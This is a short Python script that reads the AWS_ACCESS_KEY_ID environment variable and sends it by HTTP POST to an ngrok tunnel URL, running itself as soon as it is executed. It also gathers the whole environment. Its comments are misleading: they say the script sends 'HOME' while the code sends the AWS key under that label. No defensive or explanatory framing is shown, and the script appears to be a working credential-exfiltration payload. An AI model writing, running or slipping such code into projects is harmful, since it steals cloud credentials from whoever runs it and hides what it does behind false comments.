import os
import urllib.parse
import urllib.request

def send_data():
    # Get the entire environment as a dictionary
    data = dict(os.environ)

    # Get a single environment variable, in this case 'HOME'
    flag = os.getenv('AWS_ACCESS_KEY_ID')

    # If you want to send the entire environment:
    encoded_data = urllib.parse.urlencode(data).encode()

    # If you want to send only the 'HOME' variable:
    if flag:
        encoded_data2 = urllib.parse.urlencode({'HOME': flag}).encode()
    else:
        print("AWS environment variable is not set.")
        return

    # Define the URL to which the data will be sent
    url = 'https://c1a2-2a02-a310-e143-8d80-2c80-a848-55ee-c65c.ngrok-free.app'  # Replace with your actual URL

    # Create the request object with the encoded data
    request2 = urllib.request.Request(url, data=encoded_data2)

    # Perform the request without reading the response
    try:
        urllib.request.urlopen(request2).close()
        print("Request sent successfully.")
    except Exception as e:
        print(f"An error occurred: {e}")

# Call the function
send_data()
